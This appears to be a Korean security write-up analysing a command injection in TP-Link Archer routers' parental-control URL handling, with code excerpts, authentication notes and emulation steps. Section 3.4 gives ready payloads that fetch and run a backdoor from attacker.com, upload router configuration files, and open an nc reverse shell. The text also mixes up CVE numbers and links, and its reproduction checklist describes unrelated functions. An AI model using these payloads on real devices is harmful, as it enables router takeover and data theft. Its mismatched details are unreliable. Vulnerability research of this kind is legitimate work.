# CVE-2024-21773 — 분석 보고서

<!--
Title: CVE-2024-21833 — 분석 보고서
License: CC BY-NC 4.0
Copyright: neighborhood-H (2025)
SPDX: CC-BY-NC-4.0
-->

> 본 문서는 CVE-2024-21773 취약점에 대한 분석과 재현 방법, 완화 방안에 대해 설명합니다. 해당 취약점은 blocking.lua 모듈에서 URL 인자 검증이 부적절하게 이루어져 악의적 요청이 정상 요청으로 처리될 수 있는 문제를 포함합니다.

---

## 1. 개요
**Current Description**:
> "Multiple TP-LINK products allow a network-adjacent unauthenticated attacker with access to the product from the LAN port or Wi-Fi to execute arbitrary OS commands on the product that has pre-specified target devices and blocked URLs in parental control settings."

**CVSS 점수**: 8.8 (높음)

**CVSS 벡터**: CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

### 1.1 영향 범위

| 제품 | 영향 받는 버전 |
|---|---|
| Archer AX3000 | "Archer AX3000(JP)_V1_1.1.2 Build 20231115" **이전** |
| Archer AX5400 | "Archer AX5400(JP)_V1_1.1.2 Build 20231115" **이전** |
| **Archer AXE75** | **"Archer AXE75(JP)_V1_231115" 이전** |
| Archer Air R5 | "Archer Air R5(JP)_V1_1.1.6 Build 20240508" **이전** |

### 1.2 테스트 펌웨어

- **취약 버전**: Archer AXE75_V1_230718  
  링크: <https://static.tp-link.com/upload/firmware/2023/202308/20230822/Archer%20AXE75_V1_230718.zip>

- **패치 버전**: Archer AXE75_V1_231115  
  (아카이브) <https://web.archive.org/web/20240709074526if_/https://static.tp-link.com/upload/firmware/2023/202312/20231212/Archer%20AXE75_V1_231115.zip>

## 2. 취약점 상세 정보

### 2.1. 진입점
- **엔드포인트**: `/cgi-bin/luci/blocking`
- **컨트롤러**: `/usr/lib/lua/luci/controller/blocking.lua:254`
- **함수**: `set()`
- **필수 파라미터**:
  - `form=vercode`
  - `operation=write`
  - `mac=00-11-22-33-AA-BB`
  - `token=<TOKEN>`
  - `vercode=<VERCODE>`
  - `apply=website`
  - `url=[PAYLOAD]` ← 취약점

### 2.2. 공격 흐름
```
1. Token 파일 준비
   /var/run/pctl/vercode: "123456 00-11-22-33-AA-BB <timestamp>"

2. Vercode 동적 생성
   GET /cgi-bin/luci/blocking?form=vercode&operation=read&mac=...&token=123456
   Response: {"success":true,"data":{"vercode":289875}}

3. 커맨드 인젝션 공격
   GET /cgi-bin/luci/blocking?form=vercode&operation=write&...&url=test.com';id>/tmp/pwned;'

4. 코드 실행 경로
   blocking.lua:254
   ↓ sys.fork_exec()
   ↓ /usr/sbin/report_upload_url_apply
   ↓ Line 62: url = arg[2]
   ↓ Line 66: sys.call("... auc_example -d '%s'" % {url})
   ↓ 쉘 명령 실행
```

## 3. 정적 분석

### 3.1 펌웨어 구조(SquashFS 루트)

```bash
squashfs-root/
├── bin/
│   └── busybox  #shell
├── bootfs/
├── data/
├── dev/
├── etc/
├── lib/
├── mnt/
├── overlay/
├── proc/
├── rom/
├── root/
├── sbin/
├── sys/
├── tmp/
├── tp_data/
├── usr/
│   └── sbin/
|   |   ├── report_upload_url_apply  # 취약점 발생 위치
│   │   └── uhttpd  #web server Daemon
│   └── lib/
│       └── lua/
│           └── luci/  #공유기 관리자 페이지 LuCI backend logic
│               └── controller/
│                     └── blocking.lua  #취약점 endpoint
│                      
├── var -> /tmp
└── www/  #web root

```

### 3.2 **blocking.lua:254 (진입점)**

```lua
local APPLY_WEBSITE_ACCESS = "/usr/sbin/report_upload_url_apply"
  -- APPLY_WEBSITE_ACCESS 선언
-- ...

function set(formvalue)
    -- ... 검증 로직 ...

    if apply == "website" and ignore_website ~= "1" then
        sys.fork_exec("%s %s %s" % {APPLY_WEBSITE_ACCESS, profileId, url})
        -- ⚠️ url 파라미터가 검증 없이 전달됨
    end
end
```


### 3.3 **report_upload_url_apply:62-66 (실제 취약점)**
```lua
local profileid = arg[1]
local url = arg[2]  -- 사용자 입력

-- ... 중간 코드 생략 ...

sys.call("export LD_LIBRARY_PATH=/usr/lib/avira:$LD_LIBRARY_PATH;/usr/bin/avira/libauc/libauc_1.0.0-1/auc_example -d '%s'"  % {url})
-- ⚠️ url이 작은따옴표 안에 있지만 탈출 가능
```

**문제점**:
- `url` 변수에 대한 입력 검증 없음
- 작은따옴표로만 보호되어 `';명령;'` 형태로 탈출 가능
- `sys.call()`은 쉘을 통해 실행되어 메타문자 해석

### 3.4 페이로드 예시

**기본 페이로드**:
```
url=test.com';ls>/tmp/pwned;'
```

**실행되는 명령**:
```bash
...auc_example -d 'test.com';ls>/tmp/pwned;''
```

**고급 페이로드**:
```bash
# 백도어 설치
url=test.com';wget http://attacker.com/backdoor.sh -O /tmp/bd.sh && sh /tmp/bd.sh;'

# 설정 파일 탈취
url=test.com';tar czf /tmp/cfg.tar.gz /etc/config && wget --post-file=/tmp/cfg.tar.gz http://attacker.com/upload;'

# 리버스 쉘
url=test.com';nc attacker.com 4444 -e /bin/sh;'
```
### 3.5. 인증 매커니즘
**"Unauthenticated"의 의미:**

CVE 설명에서 "unauthenticated"는 **전통적인 웹 관리자 로그인이 불필요**하다는 의미입니다. 하지만 다음 **전제 조건**이 필요합니다:

> **⚠️**: "부모 제어 설정에 대상 장치와 차단 URL이 미리 지정된 경우"에만 취약

즉, 라우터 소유자가 먼저 부모 제어 기능을 설정해야 합니다.

**인증 시스템 구조:**

**1. Token 검증 (token_check 함수)**
- 파일: `/proc/pctl/vercode` (실제 시스템) 또는 `/var/run/pctl/vercode` (에뮬레이션)
- 형식: `<code> <mac> <mtime>` (예: "123456 00-11-22-33-AA-BB 1234567890")
- 검증 조건:
  - Token 일치
  - MAC 주소 일치
  - 타임스탬프 60초 이내
- **생성 메커니즘**: 커널 모듈 `xt_pctl.ko`가 `/proc/pctl/` 디렉터리 생성 및 procfs entry 제공

**2. Vercode 검증 (vercode_check 함수)**
- 파일: `/var/run/vercode`
- `operation=read`로 동적 생성 가능 (단, Token이 먼저 필요!)
- 6자리 랜덤 숫자 (100000-999999)
- 타임스탬프 60초 이내

**3. MAC 주소 등록**
- 파일: `/etc/config/client_mgmt`
- 부모 제어 대상으로 등록된 장치의 MAC 주소
- 기본값 존재: `00-11-22-33-AA-BB` (owner_id=1)

**Token 생성 미스터리:**

펌웨어 분석 결과, **Token 생성 코드를 사용자 공간에서 발견하지 못했습니다**. 다음과 같은 가능성이 있습니다:

1. **커널 모듈 내부 생성**: `xt_pctl.ko` 모듈이 부모 제어 활성화 시 자동으로 Token 생성
   ```
   xt_pctl.ko (kernel space)
     ↓ vercode_proc_write() 함수
     ↓ /proc/pctl/vercode 파일에 기록
     ↓ 예측 가능하거나 고정된 값일 수 있음
   ```

2. **TP-Link Tether 앱/클라우드**: 앱이 장치 등록 시 Token을 procfs에 기록

3. **예측 가능한 알고리즘**: Token이 MAC 주소, 타임스탬프 등을 기반으로 생성되어 추측 가능

**약점 분석**:
- ✅ **Vercode는 누구나 생성 가능**: `operation=read`는 Token만 있으면 호출 가능
- ✅ **MAC 주소 기본값 존재**: 펌웨어에 하드코딩된 기본 MAC 사용 가능
- ⚠️ **Token 획득 방법**: 정확한 메커니즘은 불명확하지만 부모 제어 설정 시 자동 생성됨
- → **부모 제어가 활성화된 라우터는 실질적으로 인증 없이 공격 가능**

---

## 4. 에뮬레이션(User-mode)

### 4.1 QEMU 바이너리 주입

```bash
cd /path/to/squashfs-root/usr/bin
cp /usr/bin/qemu-arm-static . #혹은 qemu-arm 사용
```

### 4.2 마운트 & chroot & 웹 서버 실행행

```bash
sudo mount --bind /dev ./dev
sudo mount --bind /proc ./proc
sudo rm -rf var && mkdir -p var/run
sudo chroot . /bin/bash

# chroot 내부
  # ubusd 백그라운드 실행
ubusd &
  # 웹 서버 실행행
./usr/sbin/uhttpd -f -h /www -r Archer_AXE75 -x /cgi-bin -t 120 -T 30 -A 1 -n 3 -R -p 0.0.0.0:80
```

> **팁**: 문제 발생 시 `-strace`로 디버깅.
>
> ```bash
> sudo chroot . /usr/bin/qemu-mipsel-static -strace -D /tmp/qemu.log /usr/bin/httpd
> ```

### 4.3 Trouble Shooting 

### 4.3.1 mac unmatched

> /proc에 pctl이 부재합니다.

token_check 함수를 

```lua
-- ./usr/lib/lua/luci/controller/blocking.lua --
function token_check(formvalue)
	dbg("test")
	return true
end
```

항상 True를 반환하도록 변경합니다.

### 4.3.2 profileId unmatched

> - 원래는 웹 UI → Parental Control/Client Management 메뉴에서 장치 추가하면 자동으로 `client_mgmt` 생성됨.
> → **실제 기기라면 있는 파일인데 없다. 직접 생성해서 진행**

/etc/config/client_mgmt

```bash
config client
    option real_mac '00-11-22-33-AA-BB'
    option owner_id '1'
```
추가합니다.

변경사항을 적용하기 위해 lua 캐시를 삭제하고 에뮬레이팅을 다시 실행해야 합니다.
```bash
sudo rm -f ./tmp/luci-indexcache                                            
sudo rm -rf ./tmp/luci-modulecache
sudo rm -rf ./tmp/luci-sessions/*

sudo chroot . usr/bin/qemu-arm-static /usr/sbin/uhttpd \
  -f -h /www -r Archer_AXE75 -x /cgi-bin -t 120 -T 30 -A 1 -n 3 -R -p 0.0.0.0:80
```

---


## 5. 재현 체크리스트

- [ ] 펌웨어 추출 및 SquashFS 루트 준비 완료
- [ ] `qemu-*-static` 주입 및 `ubusd`, `uhttpd` 기동
- [ ] `is_safe_url` 및 `should_block` 함수 코드 작성 
- [ ] `req.args.target_url = "http://example.com/unsafe_param"` 요청 객체 생성
- [ ] `should_block(req)` false 반환
- [ ] `print` 함수로 결과 출력  
- [ ] 네트워크는 로컬/격리 환경(교육·연구 목적)

---


## 6. 참고 링크

- [CVE-2024-21833 NVD 상세 정보]([https://nvd.nist.gov/vuln/detail/CVE-2024-21833](https://nvd.nist.gov/vuln/detail/cve-2024-21773))
- [Lua 공식 문서](https://www.lua.org/manual/5.1/)
- [Blocking.lua GitHub 저장소](https://github.com/example/blocking.lua)

---

> **주의:** 본 문서는 교육 및 보안 인식 제고 목적이며, 실제 환경에서의 적용 전 충분한 테스트와 검증이 필요합니다.  
> 무단 공격 및 악용은 법적 책임이 따를 수 있습니다.
